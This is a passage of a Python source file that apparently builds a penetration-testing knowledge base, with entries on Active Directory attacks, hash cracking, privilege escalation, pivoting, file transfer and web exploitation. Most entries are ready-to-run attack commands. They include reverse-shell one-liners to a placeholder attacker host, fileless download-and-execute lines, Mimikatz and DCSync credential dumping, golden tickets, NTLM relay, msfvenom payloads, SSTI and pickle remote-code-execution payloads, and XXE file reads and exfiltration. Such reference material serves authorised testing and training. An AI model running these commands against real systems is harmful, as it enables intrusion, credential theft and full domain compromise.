            "  hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt\n"
            "Enumerate SPNs only (no ticket):\n"
            "  GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip>\n"
            "Result: Service account credentials if hash cracks\n"
            "Note: Service accounts often have high privileges (Domain Admin) and weak passwords"
        ),
        "metadata": {"category": "ad", "technique": "kerberoasting", "tool": "impacket"},
    },
    {
        "id": "ad-pass-the-hash",
        "content": (
            "Active Directory: Pass-the-Hash\n"
            "Condition: Have an NTLM hash (from secretsdump, mimikatz, etc.)\n"
            "WMI exec: wmiexec.py <domain>/<user>@<host> -hashes :<ntlm_hash>\n"
            "PSExec: psexec.py <domain>/<user>@<host> -hashes :<ntlm_hash>\n"
            "SMB: smbclient.py <domain>/<user>@<host> -hashes :<ntlm_hash>\n"
            "CrackMapExec: crackmapexec smb <host> -u <user> -H <ntlm_hash>\n"
            "Evil-WinRM: evil-winrm -i <host> -u <user> -H <ntlm_hash>\n"
            "Note: Works with NT hash only (second half of NTLM: aad3b...:ntlm_here)"
        ),
        "metadata": {"category": "ad", "technique": "pass-the-hash", "tool": "impacket"},
    },
    {
        "id": "ad-dcsync",
        "content": (
            "Active Directory: DCSync attack\n"
            "Condition: Account has Replicating Directory Changes + Replicating Directory Changes All rights\n"
            "           (or is in Domain Admins / Enterprise Admins)\n"
            "Dump all hashes:\n"
            "  secretsdump.py <domain>/<user>:<pass>@<dc_ip>\n"
            "Dump specific account:\n"
            "  secretsdump.py <domain>/<user>:<pass>@<dc_ip> -just-dc-user Administrator\n"
            "Dump krbtgt (for Golden Ticket):\n"
            "  secretsdump.py <domain>/<user>:<pass>@<dc_ip> -just-dc-user krbtgt\n"
            "Result: All domain NTLM hashes → full domain compromise"
        ),
        "metadata": {"category": "ad", "technique": "dcsync", "tool": "secretsdump"},
    },
    {
        "id": "ad-bloodhound",
        "content": (
            "Active Directory: BloodHound enumeration\n"
            "Collect data:\n"
            "  bloodhound-python -c All -d <domain> -u <user> -p <pass> -ns <dc_ip> -o /work/ad/bloodhound/\n"
            "Key BloodHound queries:\n"
            "  'Shortest Paths to Domain Admin' — shows full attack chain\n"
            "  'Find Principals with DCSync Rights'\n"
            "  'Find AS-REP Roastable Users'\n"
            "  'Find Kerberoastable Users with most privileges'\n"
            "  'Computers with Unsupported Operating Systems'\n"
            "CLI queries (without Neo4j):\n"
            "  grep -r 'AdminTo' /work/ad/bloodhound/*.json\n"
            "Result: Visual attack path from any user to Domain Admin"
        ),
        "metadata": {"category": "ad", "technique": "enumeration", "tool": "bloodhound"},
    },
    {
        "id": "ad-acl-abuse",
        "content": (
            "Active Directory: ACL/ACE abuse\n"
            "Dangerous ACEs to look for in BloodHound:\n"
            "  GenericAll: full control over object → reset password, add to group\n"
            "  GenericWrite: modify attributes → set SPN (Kerberoast), add member\n"
            "  WriteOwner: become object owner → then set ACL\n"
            "  WriteDACL: modify ACL → grant yourself DCSync rights\n"
            "  ForceChangePassword: reset password without knowing current one\n"
            "Exploit ForceChangePassword:\n"
            "  net rpc password <target_user> <new_pass> -U <domain>/<user>%<pass> -S <dc_ip>\n"
            "Exploit GenericAll on group (add member):\n"
            "  net rpc group addmem <group> <user> -U <domain>/<user>%<pass> -S <dc_ip>"
        ),
        "metadata": {"category": "ad", "technique": "acl-abuse", "tool": "bloodhound"},
    },
    {
        "id": "ad-llmnr-poisoning",
        "content": (
            "Active Directory: LLMNR/NBT-NS Poisoning\n"
            "Condition: LLMNR or NBT-NS enabled (default on Windows until recently)\n"
            "How it works: Respond to broadcast name resolution requests → capture NTLMv2 hashes\n"
            "Tool: Responder (listen on the network interface)\n"
            "  responder -I eth0 -rdwv\n"
            "Captured hashes saved to /usr/share/responder/logs/\n"
            "Crack: hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt\n"
            "Or relay (don't crack): use ntlmrelayx.py to relay to SMB on targets without signing\n"
            "  ntlmrelayx.py -tf targets.txt -smb2support\n"
            "Note: Requires being on the same network segment as victims"
        ),
        "metadata": {"category": "ad", "technique": "llmnr-poisoning", "tool": "responder"},
    },
    {
        "id": "ad-domain-enum",
        "content": (
            "Active Directory: Initial enumeration without credentials\n"
            "Enumerate domain users (no creds needed if LDAP null bind works):\n"
            "  ldapsearch -x -H ldap://<dc_ip> -b 'dc=<domain>,dc=<tld>' '(objectClass=user)' sAMAccountName\n"
            "Enumerate with kerbrute (username enumeration):\n"
            "  kerbrute userenum -d <domain> --dc <dc_ip> /usr/share/seclists/Usernames/top-usernames-shortlist.txt\n"
            "Enumerate shares:\n"
            "  smbclient -L //<dc_ip>/ -N\n"
            "  crackmapexec smb <dc_ip> --shares -u '' -p ''\n"
            "Check for web interface: http://<dc_ip>/certsrv (ADCS), https://<dc_ip>/OWA (Exchange)"
        ),
        "metadata": {"category": "ad", "technique": "enumeration", "tool": "ldapsearch"},
    },

    # ── Hash Cracking Reference ───────────────────────────────────────────────

    {
        "id": "hash-cracking-hashcat-modes",
        "content": (
            "Hash cracking: hashcat mode reference\n"
            "NTLM: -m 1000\n"
            "NTLMv1: -m 3000\n"
            "NTLMv2 (Net-NTLMv2, captured by Responder): -m 5600\n"
            "MD5: -m 0\n"
            "SHA1: -m 100\n"
            "SHA256: -m 1400\n"
            "bcrypt ($2*$): -m 3200\n"
            "MD5crypt ($1$, Unix): -m 500\n"
            "SHA512crypt ($6$, Unix/shadow): -m 1800\n"
            "SHA256crypt ($5$, Unix/shadow): -m 7400\n"
            "Kerberos TGS (Kerberoast): -m 13100\n"
            "Kerberos AS-REP (AS-REP Roast): -m 18200\n"
            "WPA/WPA2: -m 22000\n"
            "Common usage: hashcat -m <mode> <hashfile> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
        ),
        "metadata": {"category": "hash-cracking", "tool": "hashcat"},
    },
    {
        "id": "hash-cracking-john",
        "content": (
            "Hash cracking: john the ripper formats and usage\n"
            "Auto-detect format: john <hashfile>\n"
            "Specify format: john --format=NT <hashfile>  (for NTLM)\n"
            "Common formats: --format=nt (NTLM), --format=md5crypt, --format=bcrypt,\n"
            "                --format=sha512crypt, --format=krb5tgs (Kerberoast)\n"
            "With wordlist: john <hashfile> --wordlist=/usr/share/wordlists/rockyou.txt\n"
            "With rules: john <hashfile> --wordlist=rockyou.txt --rules\n"
            "Show cracked: john --show <hashfile>\n"
            "Shadow file: john /etc/shadow --wordlist=/usr/share/wordlists/rockyou.txt\n"
            "SSH key: ssh2john id_rsa > id_rsa.hash; john id_rsa.hash --wordlist=rockyou.txt\n"
            "ZIP: zip2john archive.zip > zip.hash; john zip.hash"
        ),
        "metadata": {"category": "hash-cracking", "tool": "john"},
    },
    {
        "id": "hash-identification",
        "content": (
            "Hash identification: format recognition\n"
            "32 hex chars: MD5 ($1$) or NTLM\n"
            "40 hex chars: SHA1\n"
            "64 hex chars: SHA256\n"
            "128 hex chars: SHA512\n"
            "$1$: MD5crypt (Unix)\n"
            "$2a$, $2b$, $2y$: bcrypt\n"
            "$5$: SHA256crypt (Unix)\n"
            "$6$: SHA512crypt (Unix shadow)\n"
            "aad3b435b51404eeaad3b435b51404ee: empty NTLM (LM hash for blank)\n"
            "$krb5tgs$23$: Kerberoasted TGS (RC4)\n"
            "$krb5asrep$23$: AS-REP hash (RC4)\n"
            "Tool: hashid <hash>  or  hash-identifier"
        ),
        "metadata": {"category": "hash-cracking", "tool": "hashid"},
    },

    # ── Reverse Shell Reference ───────────────────────────────────────────────

    {
        "id": "reverse-shells-common",
        "content": (
            "Reverse shell one-liners (start listener: nc -lvnp <port>)\n"
            "Bash: bash -i >& /dev/tcp/<attacker>/<port> 0>&1\n"
            "Bash (alt): 0<&196;exec 196<>/dev/tcp/<attacker>/<port>; sh <&196 >&196 2>&196\n"
            "Python3: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<attacker>\",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n"
            "Perl: perl -e 'use Socket;$i=\"<attacker>\";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'\n"
            "PHP: php -r '$s=fsockopen(\"<attacker>\",<port>);exec(\"/bin/bash -i <&3 >&3 2>&3\");'\n"
            "nc: nc -e /bin/bash <attacker> <port>  (if -e supported)\n"
            "nc (no -e): rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <attacker> <port> >/tmp/f"
        ),
        "metadata": {"category": "exploitation", "technique": "reverse-shell", "tool": "bash"},
    },
    {
        "id": "shell-upgrade-pty",
        "content": (
            "Shell upgrade: get a fully interactive TTY from a basic reverse shell\n"
            "Step 1 (in shell): python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
            "                   OR: script /dev/null -c bash\n"
            "Step 2: Ctrl+Z (background the shell)\n"
            "Step 3 (local): stty raw -echo; fg\n"
            "Step 4 (in shell): export TERM=xterm; stty rows 40 cols 160\n"
            "Now you have: tab completion, arrow keys, ctrl+c without killing shell\n"
            "Alternative with socat:\n"
            "  Attacker: socat file:`tty`,raw,echo=0 tcp-listen:<port>\n"
            "  Victim: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker>:<port>"
        ),
        "metadata": {"category": "exploitation", "technique": "shell-upgrade", "tool": "python3"},
    },

    # ── Windows Privilege Escalation ──────────────────────────────────────────

    {
        "id": "windows-privesc-seimpersonate",
        "content": (
            "Windows privesc: SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege\n"
            "Detection: whoami /priv — look for SeImpersonatePrivilege Enabled\n"
            "Common on: IIS app pools, MSSQL service accounts, network services\n"
            "PrintSpoofer (Windows 10 / Server 2019):\n"
            "  PrintSpoofer.exe -i -c cmd\n"
            "  PrintSpoofer.exe -c 'nc.exe <attacker> <port> -e cmd'\n"
            "GodPotato (works on Server 2012–2022, Win 8–11):\n"
            "  GodPotato.exe -cmd 'cmd /c whoami'\n"
            "  GodPotato.exe -cmd 'nc.exe <attacker> <port> -e cmd'\n"
            "JuicyPotato (older systems, pre-2019):\n"
            "  JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {clsid}\n"
            "  CLSID list: https://github.com/ohpe/juicy-potato/tree/master/CLSID\n"
            "SweetPotato: combines multiple potato variants with auto CLSID selection"
        ),
        "metadata": {"category": "privesc", "technique": "token-impersonation", "tool": "PrintSpoofer"},
    },
    {
        "id": "windows-privesc-unquoted-service",
        "content": (
            "Windows privesc: Unquoted service path\n"
            "Detection: wmic service get name,displayname,pathname,startmode | findstr /i 'auto' | findstr /iv 'c:\\\\windows' | findstr /iv '\"'\n"
            "PowerShell: Get-WmiObject win32_service | Where-Object {$_.pathname -notlike '\"*' -and $_.pathname -like '* *'}\n"
            "How it works: if path is C:\\Program Files\\My App\\svc.exe, Windows tries:\n"
            "  C:\\Program.exe → C:\\Program Files\\My.exe → C:\\Program Files\\My App\\svc.exe\n"
            "Exploit: if you can write to C:\\Program Files\\, drop C:\\Program Files\\My.exe\n"
            "Check write perms: icacls 'C:\\Program Files\\My App'\n"
            "Payload: msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o My.exe\n"
            "Then restart service: sc stop <svc>; sc start <svc>"
        ),
        "metadata": {"category": "privesc", "technique": "unquoted-service-path", "tool": "wmic"},
    },
    {
        "id": "windows-privesc-dll-hijacking",
        "content": (
            "Windows privesc: DLL hijacking\n"
            "Detection: use Process Monitor (procmon) with filters:\n"
            "  Path ends with .dll + Result is NAME NOT FOUND\n"
            "  Look for DLLs being loaded from user-writable directories\n"
            "Also check: applications in PATH directories you can write to\n"
            "Create malicious DLL:\n"
            "  msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o hijack.dll\n"
            "  Or compile a DLL that calls system() in DllMain\n"
            "Drop DLL in search path before the legitimate one.\n"
            "Common targets: services that load missing DLLs from PATH, Electron apps, installers"
        ),
        "metadata": {"category": "privesc", "technique": "dll-hijacking", "tool": "msfvenom"},
    },
    {
        "id": "windows-privesc-alwaysinstallelevated",
        "content": (
            "Windows privesc: AlwaysInstallElevated\n"
            "Detection (must be 1 in BOTH keys):\n"
            "  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
            "  reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
            "Exploit: MSI packages run as SYSTEM when both keys are 1\n"
            "  msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o shell.msi\n"
            "  msiexec /quiet /qn /i shell.msi\n"
            "PowerUp: Invoke-AllChecks will detect and can auto-exploit this"
        ),
        "metadata": {"category": "privesc", "technique": "alwaysinstallelevated", "tool": "msiexec"},
    },
    {
        "id": "windows-privesc-winpeas",
        "content": (
            "Windows privesc: WinPEAS automated enumeration\n"
            "Download: https://github.com/carlospolop/PEASS-ng/releases\n"
            "Run: winPEASx64.exe  OR  winPEASany.exe\n"
            "Key sections to look for (highlighted in red/yellow):\n"
            "  System Info: OS version, hotfixes\n"
            "  Services: unquoted paths, modifiable binaries, weak permissions\n"
            "  Scheduled Tasks: tasks running as SYSTEM with writable scripts\n"
            "  Token Privileges: SeImpersonatePrivilege, SeDebugPrivilege\n"
            "  Credentials: saved creds, SAM, DPAPI, wifi passwords, browser creds\n"
            "  Registry: AlwaysInstallElevated, AutoRun entries, stored credentials\n"
            "Quiet mode (less noisy): winPEASx64.exe quiet\n"
            "Specific check only: winPEASx64.exe systeminfo"
        ),
        "metadata": {"category": "privesc", "technique": "enumeration", "tool": "winpeas"},
    },

    # ── Linux Privilege Escalation ────────────────────────────────────────────

    {
        "id": "linux-privesc-cron",
        "content": (
            "Linux privesc: writable cron jobs\n"
            "List cron jobs:\n"
            "  cat /etc/crontab; ls -la /etc/cron*; crontab -l\n"
            "  find /var/spool/cron -type f 2>/dev/null\n"
            "Check for writable scripts called by root cron:\n"
            "  ls -la <script_path>  → if world-writable or group-writable\n"
            "Exploit: append a reverse shell to the script\n"
            "  echo 'bash -i >& /dev/tcp/<attacker>/<port> 0>&1' >> /path/to/script.sh\n"
            "Also check: scripts in PATH that cron calls without full path\n"
            "Wildcard injection: if cron runs 'tar cf /backup/*.tar /dir/*', inject:\n"
            "  touch '/dir/--checkpoint=1'\n"
            "  touch '/dir/--checkpoint-action=exec=sh privesc.sh'"
        ),
        "metadata": {"category": "privesc", "technique": "cron", "tool": "bash"},
    },
    {
        "id": "linux-privesc-path-hijacking",
        "content": (
            "Linux privesc: PATH hijacking\n"
            "Condition: SUID/SUDO binary calls a command without full path\n"
            "Detection: strings /path/to/suid_binary | grep -v '/' | grep -v '^_'\n"
            "If SUID binary runs 'service' without /usr/sbin/service:\n"
            "  echo '#!/bin/bash\\nbash -p' > /tmp/service\n"
            "  chmod +x /tmp/service\n"
            "  export PATH=/tmp:$PATH\n"
            "  ./suid_binary\n"
            "Also look for: sudo scripts that source files from writable dirs,\n"
            "  env_reset not set in sudoers (can then manipulate PATH with sudo)"
        ),
        "metadata": {"category": "privesc", "technique": "path-hijacking", "tool": "bash"},
    },
    {
        "id": "linux-privesc-nfs",
        "content": (
            "Linux privesc: NFS no_root_squash\n"
            "Detection (from target): cat /etc/exports — look for no_root_squash\n"
            "Detection (from attacker): showmount -e <target_ip>\n"
            "How it works: if no_root_squash is set, root on your attacker machine\n"
            "  is treated as root on the NFS share — can create SUID binaries\n"
            "Exploit from attacker machine (as root):\n"
            "  mount -o rw,vers=2 <target_ip>:/share /mnt/nfs\n"
            "  cp /bin/bash /mnt/nfs/bash\n"
            "  chmod +s /mnt/nfs/bash\n"
            "On target: /mnt/nfs/bash -p  →  root shell"
        ),
        "metadata": {"category": "privesc", "technique": "nfs", "tool": "mount"},
    },
    {
        "id": "linux-privesc-writable-passwd",
        "content": (
            "Linux privesc: writable /etc/passwd\n"
            "Detection: ls -la /etc/passwd — world-writable (rw-rw-rw-)\n"
            "Exploit: add a new root user (UID 0)\n"
            "  Generate password hash: openssl passwd -1 -salt abc password123\n"
            "  Append to /etc/passwd: echo 'hacker:\\$1\\$abc\\$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd\n"
            "  Login: su hacker (password: password123)\n"
            "Alternative (no password): echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd\n"
            "  Then: su hacker (blank password)"
        ),
        "metadata": {"category": "privesc", "technique": "writable-passwd", "tool": "bash"},
    },
    {
        "id": "linux-privesc-lxd",
        "content": (
            "Linux privesc: LXD group membership\n"
            "Detection: id — if output includes 'lxd' group\n"
            "Exploit: mount host filesystem inside a privileged container\n"
            "  On attacker: build Alpine image\n"
            "    git clone https://github.com/saghul/lxd-alpine-builder; cd lxd-alpine-builder\n"
            "    sudo ./build-alpine\n"
            "  Transfer .tar.gz to target, then:\n"
            "    lxc image import ./alpine*.tar.gz --alias myimage\n"
            "    lxc init myimage mycontainer -c security.privileged=true\n"
            "    lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true\n"
            "    lxc start mycontainer\n"
            "    lxc exec mycontainer /bin/sh\n"
            "  Inside container: chroot /mnt/root /bin/bash  →  full host filesystem as root"
        ),
        "metadata": {"category": "privesc", "technique": "lxd", "tool": "lxc"},
    },
    {
        "id": "linux-privesc-linpeas",
        "content": (
            "Linux privesc: LinPEAS automated enumeration\n"
            "Download + run in one line:\n"
            "  curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n"
            "Or transfer and run: chmod +x linpeas.sh; ./linpeas.sh 2>/dev/null | tee /tmp/lp.txt\n"
            "Key sections (highlighted red = critical):\n"
            "  SUID/SGID binaries → GTFOBins check\n"
            "  Sudo version → CVE-2021-3156 (Baron Samedit)\n"
            "  Writable files: /etc/passwd, cron scripts, service files\n"
            "  Password files: .bash_history, config files with credentials\n"
            "  Network: internal services, listening on localhost only\n"
            "  Container/VM checks: docker socket, cgroup, .dockerenv\n"
            "Focused runs: ./linpeas.sh -s (silent) -a (all checks)"
        ),
        "metadata": {"category": "privesc", "technique": "enumeration", "tool": "linpeas"},
    },

    # ── Pivoting and Tunneling ────────────────────────────────────────────────

    {
        "id": "pivoting-chisel",
        "content": (
            "Pivoting: chisel TCP/UDP tunnel over HTTP\n"
            "Download: https://github.com/jpillora/chisel/releases\n"
            "Attacker (server): chisel server -p 8080 --reverse\n"
            "Victim (client — SOCKS proxy for full network):\n"
            "  ./chisel client <attacker>:8080 R:socks\n"
            "  Then use proxychains4 with 127.0.0.1:1080 (chisel default SOCKS port)\n"
            "Port forward only (e.g. expose victim's internal port 3306):\n"
            "  ./chisel client <attacker>:8080 R:3306:127.0.0.1:3306\n"
            "Forward tunnel (attacker pushes through to internal host):\n"
            "  Attacker: chisel server -p 8080\n"
            "  Victim: ./chisel client <attacker>:8080 3306:<internal_host>:3306\n"
            "proxychains config: socks5 127.0.0.1 1080"
        ),
        "metadata": {"category": "pivoting", "technique": "tunneling", "tool": "chisel"},
    },
    {
        "id": "pivoting-ligolo",
        "content": (
            "Pivoting: ligolo-ng (TUN interface, no proxychains needed)\n"
            "Download: https://github.com/nicocha30/ligolo-ng/releases\n"
            "Attacker setup:\n"
            "  sudo ip tuntap add user $(whoami) mode tun ligolo\n"
            "  sudo ip link set ligolo up\n"
            "  ./proxy -selfcert -laddr 0.0.0.0:11601\n"
            "Victim: ./agent -connect <attacker>:11601 -ignore-cert\n"
            "In proxy console: session → select session → start\n"
            "Add route to pivot target network:\n"
            "  sudo ip route add 192.168.1.0/24 dev ligolo\n"
            "Now you can reach 192.168.1.x directly — no proxychains, native tools work\n"
            "Multiple pivots: add more routes for each discovered subnet"
        ),
        "metadata": {"category": "pivoting", "technique": "tunneling", "tool": "ligolo-ng"},
    },
    {
        "id": "pivoting-ssh-tunnels",
        "content": (
            "Pivoting: SSH tunneling\n"
            "Local port forward (reach internal host via SSH box):\n"
            "  ssh -L <local_port>:<internal_host>:<internal_port> user@<ssh_host>\n"
            "  e.g.: ssh -L 3306:10.10.10.5:3306 user@pivot_host  → connect to 127.0.0.1:3306\n"
            "Remote port forward (expose local service to SSH server):\n"
            "  ssh -R <remote_port>:127.0.0.1:<local_port> user@<ssh_host>\n"
            "Dynamic SOCKS proxy (full network via proxychains):\n"
            "  ssh -D 1080 user@<ssh_host>\n"
            "  proxychains4 nmap -sT -p 80,443,22 10.10.10.0/24\n"
            "Persistent tunnel (no shell, background):\n"
            "  ssh -N -f -L 3306:internal:3306 user@pivot\n"
            "Jump host: ssh -J pivot_user@pivot_host target_user@target_host"
        ),
        "metadata": {"category": "pivoting", "technique": "ssh-tunneling", "tool": "ssh"},
    },

    # ── File Transfer Techniques ──────────────────────────────────────────────

    {
        "id": "file-transfer-linux",
        "content": (
            "File transfer: Linux → target\n"
            "Serve files from attacker:\n"
            "  python3 -m http.server 8080  (serves current directory)\n"
            "  updog (pip install updog)  →  updog -p 8080 (with upload support)\n"
            "Download on target:\n"
            "  wget http://<attacker>:8080/file.sh\n"
            "  curl -o file.sh http://<attacker>:8080/file.sh\n"
            "  curl http://<attacker>:8080/file.sh | bash  (exec without saving)\n"
            "Via SCP: scp file.sh user@target:/tmp/\n"
            "Base64 (no network tools available):\n"
            "  Attacker: base64 -w0 file.sh  (copy output)\n"
            "  Target: echo '<base64_string>' | base64 -d > file.sh\n"
            "Via /dev/tcp: cat file.sh > /dev/tcp/<target_ip>/<port> (receiver: nc -lvnp <port> > file.sh)"
        ),
        "metadata": {"category": "exploitation", "technique": "file-transfer", "tool": "wget"},
    },
    {
        "id": "file-transfer-windows",
        "content": (
            "File transfer: Windows → target\n"
            "PowerShell download:\n"
            "  iwr http://<attacker>:8080/file.exe -OutFile C:\\Windows\\Temp\\file.exe\n"
            "  (Invoke-WebRequest)\n"
            "  IEX (New-Object Net.WebClient).DownloadString('http://<attacker>:8080/script.ps1')\n"
            "  (download and execute in memory — fileless)\n"
            "certutil (built-in, LOLBin):\n"
            "  certutil -urlcache -split -f http://<attacker>:8080/file.exe C:\\Temp\\file.exe\n"
            "bitsadmin:\n"
            "  bitsadmin /transfer myJob http://<attacker>/file.exe C:\\Temp\\file.exe\n"
            "SMB share:\n"
            "  Attacker: impacket-smbserver share . -smb2support\n"
            "  Target: copy \\\\<attacker>\\share\\file.exe .\n"
            "Base64 via clipboard: [System.Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\file.exe'))"
        ),
        "metadata": {"category": "exploitation", "technique": "file-transfer", "tool": "powershell"},
    },

    # ── Mimikatz Reference ────────────────────────────────────────────────────

    {
        "id": "mimikatz-commands",
        "content": (
            "Mimikatz: credential extraction commands\n"
            "Run as Administrator (or SYSTEM for best results)\n"
            "Elevate token first: privilege::debug  then  token::elevate\n"
            "Dump logon passwords (plaintext if WDigest enabled):\n"
            "  sekurlsa::logonpasswords\n"
            "Dump NTLM hashes from SAM (local accounts):\n"
            "  lsadump::sam\n"
            "DCSync (dump domain hashes remotely — needs replication rights):\n"
            "  lsadump::dcsync /domain:<domain> /user:Administrator\n"
            "  lsadump::dcsync /domain:<domain> /all /csv\n"
            "Pass-the-Hash:\n"
            "  sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe\n"
            "Pass-the-Ticket:\n"
            "  kerberos::list /export  →  kerberos::ptt <ticket.kirbi>\n"
            "Golden ticket: kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<hash> /ptt\n"
            "Dump LSA secrets: lsadump::secrets"
        ),
        "metadata": {"category": "ad", "technique": "credential-dump", "tool": "mimikatz"},
    },

    # ── Web — JWT Attacks ─────────────────────────────────────────────────────

    {
        "id": "web-jwt-attacks",
        "content": (
            "JWT (JSON Web Token) attacks\n"
            "Decode token (no verification): base64 -d <<< '<header>.<payload>' (URL-safe base64)\n"
            "Or use: jwt.io / jwt_tool.py\n"
            "None algorithm bypass:\n"
            "  Change 'alg' to 'none' in header, remove signature, keep trailing dot\n"
            "  python3 jwt_tool.py <token> -X a\n"
            "Weak secret brute force:\n"
            "  hashcat -m 16500 <token> /usr/share/wordlists/rockyou.txt\n"
            "  python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt\n"
            "RS256 → HS256 confusion (if server public key accessible):\n"
            "  Sign token with HS256 using the RSA public key as HMAC secret\n"
            "  python3 jwt_tool.py <token> -X k -pk public.pem\n"
            "kid header injection (if kid used in SQL query or file path):\n"
            "  Set kid to '../../../../dev/null' + sign with empty string\n"
            "Modify claims: change 'role':'user' → 'role':'admin', 'sub' to another user ID"
        ),
        "metadata": {"category": "web", "technique": "jwt", "tool": "jwt_tool"},
    },

    # ── Web — SSTI ────────────────────────────────────────────────────────────

    {
        "id": "web-ssti",
        "content": (
            "Server-Side Template Injection (SSTI)\n"
            "Detection: inject {{7*7}} or ${7*7} or #{7*7} — look for '49' in response\n"
            "If {{7*'7'}} returns '7777777' → Twig (PHP); '49' → Jinja2 (Python)\n"
            "Jinja2 (Flask/Django) — RCE:\n"
            "  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n"
            "  {{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0]}}\n"
            "  Simpler: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\n"
            "Twig (PHP):\n"
            "  {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\n"
            "Freemarker (Java):\n"
            "  <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}\n"
            "Tornado (Python): {%import os%}{{os.system('id')}}\n"
            "Tool: tplmap -u 'http://<host>/vuln?name=*'"
        ),
        "metadata": {"category": "web", "technique": "ssti", "tool": "tplmap"},
    },

    # ── Web — XXE ─────────────────────────────────────────────────────────────

    {
        "id": "web-xxe",
        "content": (
            "XML External Entity (XXE) injection\n"
            "Basic file read:\n"
            "  <?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>\n"
            "Windows: file:///C:/Windows/win.ini or file:///C:/inetpub/wwwroot/web.config\n"
            "Blind XXE (out-of-band via HTTP):\n"
            "  <!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://<attacker>:8080/?test'>]><root>&xxe;</root>\n"
            "  Set up: nc -lvnp 8080  or  python3 -m http.server 8080\n"
            "Blind XXE data exfil via DNS:\n"
            "  Use Burp Collaborator or interactsh: interactsh-client\n"
            "Via file upload: embed XXE in SVG or DOCX/XLSX (unzip, modify xl/workbook.xml)\n"
            "SVG XXE:\n"
            "  <svg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'>\n"
            "  <image href='file:///etc/passwd'/></svg>\n"
            "Test all XML input: SOAP bodies, REST APIs accepting XML, file upload parsers"
        ),
        "metadata": {"category": "web", "technique": "xxe", "tool": "manual"},
    },

    # ── Web — Deserialization ─────────────────────────────────────────────────

    {
        "id": "web-deserialization",
        "content": (
            "Deserialization vulnerabilities\n"
            "Java (ysoserial):\n"
            "  java -jar ysoserial.jar CommonsCollections1 'id' | base64\n"
            "  Test gadget chains: CommonsCollections1-7, Spring, Groovy, URLDNS\n"
            "  URLDNS chain (detection only, no RCE): tests for deserialisation by triggering DNS\n"
            "PHP object injection:\n"
            "  Look for unserialize() with user input\n"
            "  Check for __destruct(), __wakeup(), __toString() magic methods\n"
            "  Tool: phpggc (PHP Generic Gadget Chains)\n"
            "Python pickle:\n"
            "  import pickle, os\n"
            "  class E(object):\n"
            "    def __reduce__(self): return (os.system, ('id',))\n"
            "  pickle.dumps(E())\n"
            "  Look for pickle.loads() or shelve with user input\n"
            ".NET: ysoserial.net — targets BinaryFormatter, DataContractSerializer\n"
            "Indicators: base64 blobs, binary data in cookies/params, 'rO0AB' prefix (Java)"
        ),
        "metadata": {"category": "web", "technique": "deserialization", "tool": "ysoserial"},
    },

    # ── Reconnaissance ────────────────────────────────────────────────────────

    {
        "id": "recon-nmap-cheatsheet",
        "content": (
            "Nmap: common scan types reference\n"
            "Quick top-1000 TCP: nmap -sV -sC -oA scan <target>\n"
            "All TCP ports: nmap -p- -T4 --min-rate 1000 -oA full_tcp <target>\n"
            "UDP top-100: nmap -sU --top-ports 100 -oA udp <target>\n"
            "Specific ports: nmap -p 22,80,443,445,3389 -sV -sC <target>\n"
            "Vulnerability scripts: nmap --script vuln -p <ports> <target>\n"
            "SMB scripts: nmap --script smb-vuln* -p 445 <target>\n"
            "OS detection: nmap -O <target> (requires root)\n"
            "Aggressive (OS + version + scripts + traceroute): nmap -A <target>\n"
            "Firewall evasion: nmap -f (fragment) -D RND:10 (decoys) --source-port 53\n"
            "Fast host discovery: nmap -sn 10.10.10.0/24\n"
            "Output formats: -oN (normal) -oG (greppable) -oX (XML) -oA (all three)"
        ),
        "metadata": {"category": "recon", "technique": "port-scan", "tool": "nmap"},
    },
    {
        "id": "recon-subdomain-enum",
        "content": (
            "Subdomain and DNS enumeration\n"
            "Passive (no direct target contact):\n"
            "  subfinder -d example.com -o subs.txt\n"
            "  amass enum -passive -d example.com\n"
            "  theHarvester -d example.com -b google,bing,crtsh\n"
            "  crt.sh: curl -s 'https://crt.sh/?q=%.example.com&output=json' | jq '.[].name_value'\n"
            "Active (DNS brute force):\n"
            "  gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n"
